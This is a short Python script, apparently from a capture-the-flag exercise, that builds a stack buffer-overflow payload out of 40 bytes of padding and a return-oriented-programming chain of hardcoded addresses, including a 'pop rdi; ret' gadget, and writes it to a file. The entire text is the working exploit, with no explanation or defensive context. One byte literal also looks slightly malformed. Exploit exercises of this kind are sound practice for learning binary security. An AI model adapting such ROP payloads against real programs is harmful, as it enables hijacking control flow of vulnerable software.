payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + b'\xc3\x07\x40\x00'+ bytes(4) + \
          b'\x60\x10\x60\x00' + bytes(4)+ b'\x3e\x05\x40\00' + bytes(4) + b'\x6b\x05\x40\x00' + bytes(4) + b'\x01'+bytes(7)

file = open('payload','wb')

file.write(payload)

#0x00000000004007c3: pop rdi; ret;